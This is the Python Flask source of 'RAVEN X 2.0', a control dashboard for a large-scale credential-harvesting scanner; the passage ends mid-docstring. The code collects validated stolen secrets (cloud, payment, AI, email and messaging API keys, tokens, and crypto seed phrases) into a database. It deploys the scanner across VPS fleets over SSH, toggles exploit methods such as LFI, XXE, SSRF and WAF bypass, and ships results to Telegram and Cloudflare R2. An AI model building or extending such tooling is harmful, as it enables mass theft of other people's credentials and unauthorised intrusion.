#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAVEN X 2.0 - Real-time Dashboard with VPS Management
- Local results monitoring
- Remote VPS deployment & control
- Multi-server monitoring

Created by https://t.me/boxxboyy
"""

from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO, emit
import sqlite3
import threading
import time
import socket
from datetime import datetime
import os
import re
import json
import subprocess
import shutil
import collections
import uuid
import hashlib
import base64

# Import SSH Manager
try:
    from ssh_manager import get_manager, SSHManager
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False
    print("⚠️ SSH Manager not available - VPS features disabled")

app = Flask(__name__)
app.config['SECRET_KEY'] = 'raven-x-secret-change-in-production'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

DB_PATH = 'raven_results.db'
RESULTS_DIR = 'ResultJS'

# File mapping: (type, status)
FILE_MAPPING = {
    # VALID - Save full details
    'aws_valid.txt': ('AWS', 'valid'),
    'aws_credentials.txt': ('AWS', 'valid'),
    'valid_github_token.txt': ('GitHub', 'valid'),
    'valid_sendgrid.txt': ('SendGrid', 'valid'),
    'valid_stripe.txt': ('Stripe', 'valid'),
    'valid_openai.txt': ('OpenAI', 'valid'),
    'valid_anthropic.txt': ('Anthropic', 'valid'),
    'smtp_valid.txt': ('SMTP', 'valid'),
    'valid_mailgun.txt': ('Mailgun', 'valid'),
    'valid_twilio.txt': ('Twilio', 'valid'),
    'valid_nexmo.txt': ('Nexmo', 'valid'),
    'valid_telnyx.txt': ('Telnyx', 'valid'),
    'valid_messagebird.txt': ('MessageBird', 'valid'),
    'valid_brevo.txt': ('Brevo', 'valid'),
    'valid_mandrill.txt': ('Mandrill', 'valid'),
    'valid_mailersend.txt': ('MailerSend', 'valid'),
    'valid_gcp_key.txt': ('GCP', 'valid'),
    'mnemonic_seed_phrases.txt': ('Mnemonic', 'valid'),
    'trufflehog_secrets.txt': ('TruffleHog', 'valid'),
    'gitleaks_secrets.txt': ('GitLeaks', 'valid'),
    # Wave-5 — pattern-only finds (saved by main.go's nonValidatedChecks loop)
    'Slack_Bot_Token_found.txt':       ('Slack',         'valid'),
    'Slack_User_Token_found.txt':      ('Slack',         'valid'),
    'Slack_Webhook_found.txt':         ('Slack',         'hit'),
    'Discord_Bot_Token_found.txt':     ('Discord',       'valid'),
    'Discord_Webhook_found.txt':       ('Discord',       'hit'),
    'Cloudflare_Global_found.txt':     ('Cloudflare',    'valid'),
    'DigitalOcean_PAT_found.txt':      ('DigitalOcean',  'valid'),
    'Heroku_API_Key_found.txt':        ('Heroku',        'valid'),
    'Datadog_API_Key_found.txt':       ('Datadog',       'valid'),
    'Sentry_DSN_found.txt':            ('Sentry',        'valid'),
    'NPM_Token_found.txt':             ('NPM',           'valid'),
    'PyPI_Token_found.txt':            ('PyPI',          'valid'),
    'GitLab_PAT_found.txt':            ('GitLab',        'valid'),
    'JWT_found.txt':                   ('JWT',           'hit'),
    'Postmark_Server_Token_found.txt': ('Postmark',      'valid'),
    'Mailjet_API_Key_found.txt':       ('Mailjet',       'valid'),
    'AWS_SNS_Topic_ARN_found.txt':     ('AWS SNS',       'hit'),
    # HITS - Only count
    'smtp_found.txt': ('SMTP', 'hit'),
}

URL_LOG_FILE = os.path.join(RESULTS_DIR, 'scanned_urls.txt')
total_urls_scanned = 0
scan_start_time = time.time()
file_mtimes = {}

# ==================== LOCAL RESULTS MONITORING ====================

def count_urls_from_log():
    if not os.path.exists(URL_LOG_FILE):
        return 0
    try:
        with open(URL_LOG_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return sum(1 for line in f if line.strip())
    except:
        return 0

def count_smtp_hits():
    smtp_found_file = os.path.join(RESULTS_DIR, 'smtp_found.txt')
    if not os.path.exists(smtp_found_file):
        return 0
    try:
        with open(smtp_found_file, 'r', encoding='utf-8', errors='ignore') as f:
            return sum(1 for line in f if line.strip())
    except:
        return 0

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            type TEXT NOT NULL,
            key_value TEXT NOT NULL,
            source_url TEXT,
            status TEXT DEFAULT 'valid',
            metadata TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            UNIQUE(type, key_value)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS statistics (
            id INTEGER PRIMARY KEY,
            total_urls_scanned INTEGER DEFAULT 0,
            total_hits_found INTEGER DEFAULT 0,
            total_credentials_valid INTEGER DEFAULT 0,
            smtp_servers_found INTEGER DEFAULT 0,
            last_update DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('INSERT OR IGNORE INTO statistics (id) VALUES (1)')
    
    try:
        cursor.execute("SELECT smtp_servers_found FROM statistics LIMIT 1")
    except sqlite3.OperationalError:
        cursor.execute("ALTER TABLE statistics ADD COLUMN smtp_servers_found INTEGER DEFAULT 0")
    
    conn.commit()
    conn.close()
    print("✅ Database initialized")

def import_from_files():
    global total_urls_scanned
    
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)
        return 0, 0
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    imported_valid = 0
    imported_hits = 0
    
    for filename, (cred_type, status) in FILE_MAPPING.items():
        filepath = os.path.join(RESULTS_DIR, filename)
        
        if not os.path.exists(filepath):
            continue
        
        current_mtime = os.path.getmtime(filepath)
        if filepath in file_mtimes and file_mtimes[filepath] == current_mtime:
            continue
        
        file_mtimes[filepath] = current_mtime
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    
                    if status == 'hit':
                        imported_hits += 1
                        continue
                    
                    parts = line.split(':', 1)
                    if len(parts) < 2:
                        continue
                    
                    source_url = parts[0].strip()
                    key_and_rest = parts[1].strip()
                    
                    key_parts = key_and_rest.split(':', 1)
                    key_value = key_parts[0].strip()
                    metadata = key_parts[1].strip() if len(key_parts) > 1 else ""
                    
                    cursor.execute('''
                        INSERT OR IGNORE INTO credentials (type, key_value, source_url, metadata, status)
                        VALUES (?, ?, ?, ?, ?)
                    ''', (cred_type, key_value, source_url, metadata, 'valid'))
                    
                    if cursor.rowcount > 0:
                        imported_valid += 1
        
        except Exception as e:
            print(f"⚠️ Error reading {filename}: {e}")
    
    cursor.execute('SELECT COUNT(*) FROM credentials WHERE status="valid"')
    total_valid = cursor.fetchone()[0]
    
    total_lines = 0
    for filename in FILE_MAPPING.keys():
        filepath = os.path.join(RESULTS_DIR, filename)
        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    total_lines += sum(1 for line in f if line.strip())
            except:
                pass
    
    total_urls_scanned = count_urls_from_log()
    smtp_servers = count_smtp_hits()
    
    cursor.execute('''
        UPDATE statistics 
        SET total_urls_scanned = ?, total_hits_found = ?, total_credentials_valid = ?,
            smtp_servers_found = ?, last_update = CURRENT_TIMESTAMP
        WHERE id = 1
    ''', (total_urls_scanned, total_lines, total_valid, smtp_servers))
    
    conn.commit()
    conn.close()
    
    return imported_valid, imported_hits

def get_statistics():
    global scan_start_time
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM statistics WHERE id = 1')
    stats = cursor.fetchone()
    
    cursor.execute('''
        SELECT type, COUNT(*) as count FROM credentials
        WHERE status = 'valid' GROUP BY type ORDER BY count DESC
    ''')
    type_counts = dict(cursor.fetchall())
    
    cursor.execute('''
        SELECT type, key_value, source_url, timestamp, metadata
        FROM credentials WHERE status = 'valid'
        ORDER BY id DESC LIMIT 50
    ''')
    recent_findings = cursor.fetchall()
    
    conn.close()
    
    total_urls = stats[1] if stats else 0
    total_hits = stats[2] if stats else 0
    total_valid = stats[3] if stats else 0
    smtp_servers = stats[4] if stats and len(stats) > 4 else 0
    
    elapsed_time = time.time() - scan_start_time
    scan_rate = total_urls / elapsed_time if elapsed_time > 0 and total_urls > 0 else 0
    
    progress_percent = min(100, (total_hits / max(total_urls, 1)) * 100) if total_urls > 0 else 0
    
    return {
        'total_urls': total_urls,
        'total_hits': total_hits,
        'total_valid': total_valid,
        'smtp_servers': smtp_servers,
        'type_counts': type_counts,
        'recent_findings': recent_findings,
        'last_update': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'progress_current': total_urls,
        'progress_total': total_hits,
        'progress_percent': round(progress_percent, 1),
        'scan_rate': round(scan_rate, 2)
    }

def background_file_monitor():
    last_count = 0
    while True:
        time.sleep(2)
        try:
            imported_valid, imported_hits = import_from_files()
            stats = get_statistics()
            current_count = stats['total_valid']
            
            if current_count != last_count or imported_hits > 0:
                socketio.emit('stats_update', stats)
                last_count = current_count
        except Exception as e:
            print(f"⚠️ File monitor error: {e}")

# ==================== VPS MANAGEMENT (SSH) ====================

def get_ssh_manager():
    """Get SSH manager instance"""
    if SSH_AVAILABLE:
        return get_manager()
    return None

def vps_status_callback(data):
    """Callback for VPS status updates"""
    socketio.emit('vps_update', data)

# ==================== ROUTES ====================

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/vps')
def vps_page():
    return render_template('vps.html')

@app.route('/api/stats')
def api_stats():
    return jsonify(get_statistics())

@app.route('/api/clear', methods=['POST'])
def api_clear():
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM credentials')
        cursor.execute('UPDATE statistics SET total_urls_scanned=0, total_hits_found=0, total_credentials_valid=0, smtp_servers_found=0 WHERE id=1')
        conn.commit()
        conn.close()
        
        if os.path.exists(RESULTS_DIR):
            for filename in os.listdir(RESULTS_DIR):
                filepath = os.path.join(RESULTS_DIR, filename)
                if os.path.isfile(filepath):
                    try:
                        os.remove(filepath)
                    except:
                        pass
        
        global file_mtimes, scan_start_time
        file_mtimes.clear()
        scan_start_time = time.time()
        
        socketio.emit('stats_update', get_statistics())
        return jsonify({'success': True, 'message': 'Results cleared'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

# ==================== VPS API ROUTES ====================

@app.route('/api/vps/available')
def api_vps_available():
    """Check if VPS management is available"""
    return jsonify({'available': SSH_AVAILABLE})

@app.route('/api/vps/config', methods=['GET', 'POST'])
def api_vps_config():
    """Get or update VPS configuration"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    if request.method == 'POST':
        data = request.json
        manager.update_config(data)
        return jsonify({'success': True, 'config': manager.get_config()})
    
    return jsonify(manager.get_config())

@app.route('/api/vps/servers', methods=['GET', 'POST', 'PUT'])
def api_vps_servers():
    """Get, add, or update server list"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    if request.method == 'POST':
        data = request.json
        ips = data.get('servers', [])
        manager.save_servers(ips)
        return jsonify({'success': True, 'count': len(ips)})
    
    if request.method == 'PUT':
        data = request.json
        ip = data.get('ip')
        if ip:
            servers = manager.load_servers()
            if ip not in servers:
                servers.append(ip)
                manager.save_servers(servers)
        return jsonify({'success': True, 'servers': manager.load_servers()})
    
    return jsonify({'servers': manager.load_servers()})

@app.route('/api/vps/status')
def api_vps_status():
    """Get status of all VPS servers.

    Reads the in-memory snapshot maintained by SSHManager's monitor
    thread; does NOT trigger a fresh probe. That keeps this endpoint
    O(roster size) and well under any client-side timeout, even when
    individual workers are unreachable."""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503

    servers = manager.get_cached_status()
    stats = manager.get_global_stats()

    return jsonify({
        'servers': servers,
        'stats': stats
    })

@app.route('/api/vps/server/<ip>/status')
def api_vps_server_status(ip):
    """Get status of a specific server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    status = manager.fetch_server_status(ip)
    return jsonify(status.to_dict())

@app.route('/api/vps/server/<ip>/test')
def api_vps_test_connection(ip):
    """Test connection to a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.test_connection(ip))

@app.route('/api/vps/server/<ip>/start', methods=['POST'])
def api_vps_start_server(ip):
    """Start scanner on a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.start_server(ip))

@app.route('/api/vps/server/<ip>/stop', methods=['POST'])
def api_vps_stop_server(ip):
    """Stop scanner on a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.stop_server(ip))

@app.route('/api/vps/server/<ip>/restart', methods=['POST'])
def api_vps_restart_server(ip):
    """Restart scanner on a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.restart_server(ip))

@app.route('/api/vps/server/<ip>/logs')
def api_vps_server_logs(ip):
    """Get logs from a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    lines = request.args.get('lines', 50, type=int)
    return jsonify(manager.get_server_logs(ip, lines))

@app.route('/api/vps/server/<ip>/diagnose')
def api_vps_diagnose_server(ip):
    """Run diagnostics on a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.diagnose_server(ip))

@app.route('/api/vps/server/<ip>/fix', methods=['POST'])
def api_vps_fix_server(ip):
    """Attempt to fix issues on a server.

    Fire-and-forget: fix_server can take 30-60 s for unreachable hosts
    (multiple SSH banner timeouts + retries). That blocks an eventlet
    greenthread long enough to trip nginx's 504 default, which is what
    the operator was seeing when they hit Reconnect on a dead box.
    Kick the work to a daemon thread; the monitor cycle reflects the
    outcome within one tick."""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503

    def _bg() -> None:
        try:
            manager.fix_server(ip)
        except Exception as e:
            print(f'[fleet] async fix_server failed for {ip}: {e}')

    threading.Thread(target=_bg, daemon=True, name=f'vps-fix-{ip}').start()
    return jsonify({
        'success': True,
        'message': f'Reconnect dispatched for {ip}. Status will update on next monitor cycle (~30 s).',
    }), 202


@app.route('/api/vps/server/<ip>/remove', methods=['POST', 'DELETE'])
def api_vps_remove_server(ip):
    """Drop a host from the rostered fleet.

    The dashboard's per-card trash icon POSTs here. Endpoint was missing,
    which is why the operator saw "POST .../remove → 404 (NOT FOUND)" in
    the console and dead cards couldn't be evicted.

    Cleans up: server_ips.txt (drops the line), fleet_creds.json (drops
    the entry), the pooled SSHClient, the monitor's status snapshot, and
    the per-IP last-error/miss counters. Worker filesystem is untouched —
    operator may want to re-enroll later."""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503

    removed_from_roster = False
    server_ips = os.path.join('.', 'server_ips.txt')
    try:
        if os.path.exists(server_ips):
            with open(server_ips, 'r') as f:
                lines = [ln.strip() for ln in f if ln.strip()]
            kept = [ln for ln in lines if ln != ip]
            if len(kept) != len(lines):
                with open(server_ips, 'w') as f:
                    for ln in kept:
                        f.write(ln + '\n')
                removed_from_roster = True
    except Exception as e:
        return jsonify({'error': f'failed to update roster: {e}'}), 500

    removed_creds = False
    try:
        creds = _load_fleet_creds()
        if ip in creds:
            del creds[ip]
            _save_fleet_creds(creds)
            removed_creds = True
    except Exception as e:
        print(f'[fleet] failed to drop creds for {ip}: {e}')

    # Best-effort manager-side cleanup. None of these are fatal if they
    # silently no-op (e.g., the IP was never probed).
    try:
        manager._evict_pooled_ssh(ip)
    except Exception:
        pass
    try:
        with manager.lock:
            manager.servers.pop(ip, None)
            manager._consecutive_misses.pop(ip, None)
            if hasattr(manager, '_last_ssh_error'):
                manager._last_ssh_error.pop(ip, None)
    except Exception:
        pass

    return jsonify({
        'success': True,
        'ip': ip,
        'removed_from_roster': removed_from_roster,
        'removed_creds': removed_creds,
    })

@app.route('/api/vps/server/<ip>/deploy', methods=['POST'])
def api_vps_deploy_server(ip):
    """Deploy to a specific server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    package = request.json.get('package') if request.json else None
    return jsonify(manager.deploy_to_server(ip, package))

@app.route('/api/vps/server/<ip>/collect', methods=['POST'])
def api_vps_collect_server(ip):
    """Collect results from a server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    return jsonify(manager.collect_results(ip))

# Bulk operations
@app.route('/api/vps/start-all', methods=['POST'])
def api_vps_start_all():
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.start_all())

@app.route('/api/vps/stop-all', methods=['POST'])
def api_vps_stop_all():
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.stop_all())

@app.route('/api/vps/restart-all', methods=['POST'])
def api_vps_restart_all():
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.restart_all())

@app.route('/api/vps/deploy-all', methods=['POST'])
def api_vps_deploy_all():
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    package = request.json.get('package') if request.json else None
    return jsonify(manager.deploy_all(package))

@app.route('/api/vps/collect-all', methods=['POST'])
def api_vps_collect_all():
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.collect_all_results())

@app.route('/api/vps/test-connections', methods=['POST'])
def api_vps_test_connections():
    """Test connections to all servers"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.test_all_connections())

@app.route('/api/vps/prepare-deploy', methods=['POST'])
def api_vps_prepare_deploy():
    """Prepare deployment - test connections, count targets, calculate split"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    data = request.json or {}
    target_file = data.get('target_file')
    return jsonify(manager.prepare_deployment(target_file))

@app.route('/api/vps/deploy', methods=['POST'])
def api_vps_deploy():
    """Full deployment - split targets, upload, setup, optionally start"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    data = request.json or {}
    result = manager.deploy_full(
        target_file=data.get('target_file'),
        scanner_file=data.get('scanner_file'),
        runner_file=data.get('runner_file'),
        auto_start=data.get('auto_start', False)
    )
    return jsonify(result)

@app.route('/api/vps/upload-targets', methods=['POST'])
def api_vps_upload_targets():
    """Upload target file"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    # Save to targets.txt
    target_path = 'targets.txt'
    file.save(target_path)
    
    # Count lines
    with open(target_path, 'r') as f:
        count = sum(1 for line in f if line.strip())
    
    return jsonify({'success': True, 'filename': file.filename, 'targets': count})

@app.route('/api/vps/upload-chunk', methods=['POST'])
def api_vps_upload_chunk():
    """Accept one chunk of a large target-list upload.

    Body is the raw chunk content (text/plain). upload_id and
    chunk_index come from query string. JSON-wrapping the payload would
    force Flask to buffer + parse the entire 5–10 MB body synchronously
    under an eventlet worker, which starves the cooperative scheduler
    and trips the gunicorn worker-timeout → nginx 502 "Server Hangup"
    once enough chunks queue up. Streaming straight to disk avoids that.
    """
    upload_id = str(request.args.get('upload_id', ''))
    try:
        chunk_index = int(request.args.get('chunk_index', '-1'))
    except ValueError:
        chunk_index = -1

    if not re.match(r'^[a-zA-Z0-9_-]{8,64}$', upload_id):
        return jsonify({'error': 'Invalid upload_id'}), 400
    if chunk_index < 0:
        return jsonify({'error': 'Invalid chunk_index'}), 400

    chunk_dir = f'/tmp/reconx_{upload_id}'
    try:
        os.makedirs(chunk_dir, exist_ok=True)
    except OSError as e:
        return jsonify({'error': f'cannot create chunk dir: {e}'}), 500
    chunk_path = os.path.join(chunk_dir, f'{chunk_index:08d}')

    # Stream the request body to disk in 256 KiB blocks. werkzeug's
    # request.stream yields cooperatively under eventlet so other
    # requests (and the SSH monitor) keep getting time slices.
    bytes_written = 0
    try:
        with open(chunk_path, 'wb') as f:
            while True:
                block = request.stream.read(256 * 1024)
                if not block:
                    break
                f.write(block)
                bytes_written += len(block)
    except OSError as e:
        return jsonify({'error': f'write failed: {e}'}), 500

    return jsonify({'ok': True, 'chunk': chunk_index, 'bytes': bytes_written})


@app.route('/api/vps/finalize-upload', methods=['POST'])
def api_vps_finalize_upload():
    """Assemble chunks written by /upload-chunk into targets.txt."""
    data = request.get_json(force=True, silent=True) or {}
    upload_id = str(data.get('upload_id', ''))
    total_chunks = int(data.get('total_chunks', 0))
    filename = str(data.get('filename', 'targets.txt'))

    if not re.match(r'^[a-zA-Z0-9_-]{8,64}$', upload_id):
        return jsonify({'error': 'Invalid upload_id'}), 400

    chunk_dir = f'/tmp/reconx_{upload_id}'
    if not os.path.isdir(chunk_dir):
        return jsonify({'error': 'Upload session not found — chunks may have expired'}), 404

    target_path = 'targets.txt'
    count = 0
    # Stream-concatenate the binary chunks into the final file, then
    # split on newlines so we still produce one-target-per-line output
    # and count non-empty lines for the response. Reading in 1 MiB blocks
    # avoids loading any chunk fully into memory.
    leftover = b''
    try:
        with open(target_path, 'wb') as out:
            for i in range(total_chunks):
                chunk_path = os.path.join(chunk_dir, f'{i:08d}')
                if not os.path.exists(chunk_path):
                    return jsonify({'error': f'Missing chunk {i}'}), 400
                with open(chunk_path, 'rb') as cf:
                    while True:
                        block = cf.read(1024 * 1024)
                        if not block:
                            break
                        block = leftover + block
                        last_nl = block.rfind(b'\n')
                        if last_nl == -1:
                            leftover = block
                            continue
                        for raw_line in block[:last_nl].split(b'\n'):
                            stripped = raw_line.strip()
                            if stripped:
                                out.write(stripped + b'\n')
                                count += 1
                        leftover = block[last_nl + 1:]
            if leftover.strip():
                out.write(leftover.strip() + b'\n')
                count += 1
    finally:
        shutil.rmtree(chunk_dir, ignore_errors=True)

    return jsonify({'success': True, 'filename': filename, 'targets': count})


@app.route('/api/vps/test-ssh', methods=['POST'])
def api_vps_test_ssh():
    """Quick SSH key validation - check if key exists and is valid"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    return jsonify(manager.quick_ssh_test())

@app.route('/api/vps/test-single/<ip>', methods=['POST'])
def api_vps_test_single(ip):
    """Test SSH connection to a single server"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    timeout = request.json.get('timeout', 5) if request.json else 5
    return jsonify(manager.test_single_connection(ip, timeout))

@app.route('/api/vps/list-files')
def api_vps_list_files():
    """List local files available for selection as targets"""
    manager = get_ssh_manager()
    if not manager:
        return jsonify({'error': 'SSH not available'}), 503
    
    directory = request.args.get('dir', '.')
    files = manager.list_local_files(directory)
    return jsonify({'files': files})

@app.route('/api/vps/select-file', methods=['POST'])
def api_vps_select_file():
    """Select an existing file as target"""
    data = request.json or {}
    filepath = data.get('path')
    
    if not filepath:
        return jsonify({'error': 'No file path provided'}), 400
    
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    
    # Count lines
    try:
        with open(filepath, 'r', errors='ignore') as f:
            count = sum(1 for line in f if line.strip())
        
        # Update config to use this file
        manager = get_ssh_manager()
        if manager:
            manager.update_config({'target_file': filepath})
        
        return jsonify({
            'success': True, 
            'path': filepath, 
            'filename': os.path.basename(filepath),
            'targets': count
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ==================== SCANNER CONFIG ====================

SCANNER_CONFIG_PATH = 'config.json'

# Only these keys may be read/written via the dashboard. Every flag listed here
# is consumed by main.go at runtime — see audit notes in CrackerWorkspace.
SCANNER_CONFIG_SCHEMA = {
    'scanning_features': ['aws_main_scan', 'github_token_deep_scan', 'smtp_credentials_scan'],
    'aws_checks': ['ses_quota_check', 'sns_limit_check', 'fargate_limit_check', 'federation_console_url'],
    'api_validation': [
        'openai', 'anthropic', 'ai_all', 'stripe', 'gcp_api_key', 'sendgrid', 'mailgun',
        'twilio', 'nexmo', 'telnyx', 'messagebird', 'github',
    ],
    'features': ['brevo', 'xsmtp', 'mandrill', 'mailersend', 'new_mailgun'],
    'exploit_methods': ['react2shell', 'bypass_waf', 'bypass_middleware', 'lfi', 'xxe', 'ssrf'],
}


def _load_scanner_config():
    if not os.path.exists(SCANNER_CONFIG_PATH):
        return {}
    with open(SCANNER_CONFIG_PATH, 'r') as f:
        return json.load(f)


def _scanner_config_view(cfg):
    out = {}
    for section, keys in SCANNER_CONFIG_SCHEMA.items():
        block = cfg.get(section) or {}
        out[section] = {k: bool(block.get(k, False)) for k in keys}
    return out


@app.route('/api/scanner-config', methods=['GET', 'POST'])
def api_scanner_config():
    """Read or update the live scanner toggles in raven/config.json.
    Only whitelisted keys (those actually consumed by main.go) are exposed."""
    try:
        cfg = _load_scanner_config()
    except Exception as e:
        return jsonify({'error': f'Could not read config: {e}'}), 500

    if request.method == 'POST':
        body = request.json or {}
        for section, keys in SCANNER_CONFIG_SCHEMA.items():
            incoming = body.get(section)
            if not isinstance(incoming, dict):
                continue
            current = cfg.get(section)
            if not isinstance(current, dict):
                current = {}
                cfg[section] = current
            for k in keys:
                if k in incoming:
                    current[k] = bool(incoming[k])
        try:
            with open(SCANNER_CONFIG_PATH, 'w') as f:
                json.dump(cfg, f, indent=2)
        except Exception as e:
            return jsonify({'error': f'Could not write config: {e}'}), 500

    return jsonify(_scanner_config_view(cfg))


# ==================== TELEGRAM ====================


@app.route('/api/telegram', methods=['GET', 'POST'])
def api_telegram():
    """Read/write telegram bot_token + chat_id in config.json. Used by main.go for outbound alerts."""
    try:
        cfg = _load_scanner_config()
    except Exception as e:
        return jsonify({'error': f'Could not read config: {e}'}), 500

    if request.method == 'POST':
        body = request.json or {}
        tg = cfg.get('telegram')
        if not isinstance(tg, dict):
            tg = {}
            cfg['telegram'] = tg
        if 'bot_token' in body:
            tg['bot_token'] = str(body['bot_token'] or '')
        if 'chat_id' in body:
            tg['chat_id'] = str(body['chat_id'] or '')
        try:
            with open(SCANNER_CONFIG_PATH, 'w') as f:
                json.dump(cfg, f, indent=2)
        except Exception as e:
            return jsonify({'error': f'Could not write config: {e}'}), 500

    tg = cfg.get('telegram') or {}
    # Mask token in GET response — return only whether it's present + last 4 chars for confirmation
    token = str(tg.get('bot_token') or '')
    masked = f'…{token[-4:]}' if len(token) > 4 else ''
    return jsonify({
        'has_token': bool(token),
        'token_tail': masked,
        'chat_id': str(tg.get('chat_id') or ''),
    })


@app.route('/api/telegram/test', methods=['POST'])
def api_telegram_test():
    """Send a test message via the configured telegram bot. Returns success / error."""
    import urllib.request
    import urllib.parse
    try:
        cfg = _load_scanner_config()
    except Exception as e:
        return jsonify({'success': False, 'error': f'Could not read config: {e}'}), 500
    tg = cfg.get('telegram') or {}
    token = tg.get('bot_token') or ''
    chat = tg.get('chat_id') or ''
    if not token or not chat:
        return jsonify({'success': False, 'error': 'Telegram not configured (bot_token + chat_id required).'}), 400
    text = (request.json or {}).get('text') if request.is_json else None
    payload = urllib.parse.urlencode({'chat_id': chat, 'text': text or 'ReconX dashboard test ping.'}).encode()
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    try:
        with urllib.request.urlopen(url, data=payload, timeout=8) as resp:
            data = json.loads(resp.read().decode('utf-8') or '{}')
        if not data.get('ok'):
            return jsonify({'success': False, 'error': str(data.get('description') or 'Telegram refused.')}), 502
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 502


# ── Cloudflare R2 upload ───────────────────────────────────────────────────
R2_CONFIG_KEY = 'r2'

def _get_r2_client():
    """Return (boto3_client, bucket_name, state, error).

    state ∈ {'connected', 'misconfigured', 'unreachable', 'unknown'}.
    - 'connected'      → client + bucket usable (constructor succeeded;
                          live reachability is verified separately by the
                          periodic head_bucket probe)
    - 'misconfigured'  → one or more credential fields blank/missing
    - 'unreachable'    → boto3 missing or constructor raised
    - 'unknown'        → reserved for the cache before the first probe

    The previous shape collapsed every failure mode into (None, None)
    which is why /api/warc/export-to-r2 reported "R2 not configured"
    when the real cause was a missing boto3 install. Callers must now
    unpack four values; pass `error` through to the user instead of
    hard-coding a misleading default message.
    """
    cfg = _load_scanner_config()
    r2 = cfg.get(R2_CONFIG_KEY, {})
    account_id  = r2.get('account_id', '').strip()
    access_key  = r2.get('access_key_id', '').strip()
    secret_key  = r2.get('secret_access_key', '').strip()
    bucket      = r2.get('bucket_name', '').strip()

    missing = []
    if not account_id: missing.append('account_id')
    if not access_key: missing.append('access_key_id')
    if not secret_key: missing.append('secret_access_key')
    if not bucket:     missing.append('bucket_name')
    if missing:
        return None, None, 'misconfigured', f"missing fields: {', '.join(missing)}"

    try:
        import boto3
    except Exception as e:
        return None, None, 'unreachable', f'boto3 import failed: {e}'

    try:
        client = boto3.client(
            's3',
            endpoint_url=f'https://{account_id}.r2.cloudflarestorage.com',
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            region_name='auto',
        )
    except Exception as e:
        return None, None, 'unreachable', str(e)

    return client, bucket, 'connected', None


# Soft cap on total R2 storage. The operator-facing rule is "stay under
# 9.5 GB" — at 75% / 95% the dashboard fires warnings; we never refuse an
# upload here so a noisy harvest can still finish. Eviction is left to the
# lifecycle rule + manual delete from the cockpit listing.
R2_USAGE_LIMIT_BYTES = int(9.5 * 1024 * 1024 * 1024)


def _r2_usage_breakdown(client, bucket: str) -> dict:
    """List every object in the bucket and bucket-sum sizes by category.
    Categories are determined by key prefix: `warc/` = WARC harvests,
    `uploads/` = target lists, `hits/` = scan hits (priority — never count
    towards the cap), everything else is `other`.
